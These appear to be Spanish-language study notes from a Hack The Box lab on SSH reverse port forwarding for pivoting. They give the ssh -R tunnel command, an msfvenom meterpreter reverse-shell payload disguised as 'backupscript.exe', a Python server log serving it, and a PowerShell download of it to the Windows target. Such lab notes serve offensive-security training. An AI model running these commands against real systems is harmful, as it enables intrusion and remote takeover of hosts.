# Remote/Reverse Port Forwarding with SSH

- SSH puede escuchar en nuestro host local y reenviar un servicio en el host remoto a nuestro puerto, y el reenvío de puertos dinámico, donde podemos enviar paquetes a una red remota a través de un host pivote. Pero a veces, puede que queramos reenviar un servicio local al puerto remoto también. Consideremos el escenario en el que podemos RDP en el host de Windows Windows A. Como se puede ver en la imagen de abajo, en nuestro caso anterior, podríamos pivotar en el host de Windows a través del servidor Ubuntu.
![](https://academy.hackthebox.com/storage/modules/158/33.png)


- meterpreter (maquina atacante) <=> maquina pivot => windows A
- Para entonces:  meterpreter <=== windows A
- En nuestra maquina atacante: `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

![](https://academy.hackthebox.com/storage/modules/158/44.png)

- Entonces por ejemplo a la reverse shell de lhost le vamos a poner la IP del pivot:
- `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`
- Luego al ya haber creado el tunnel reverso podemos abrir un python http server en nuestra maquina atacante
```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ python3 -m http.server 8080                                                
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
127.0.0.1 - - [13/Jan/2025 12:38:14] "GET /backupscript.exe HTTP/1.1" 200 -
```

- En la maquina windows hacemos una peticion HTTP get de la shell
```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8080/backupscript.exe" -OutFile "C:\backupscript.exe"
```
- Como se puede apreciar, en el servidor http parece que "localhost" hizo la petición, y esto es justamente por el tunnel reverso.
- importante en el msfconsole, dentro del multihandler poner `set lhost 0.0.0.0` para que tome cualquier acceso al puerto especificado en el tunnel con ssh.
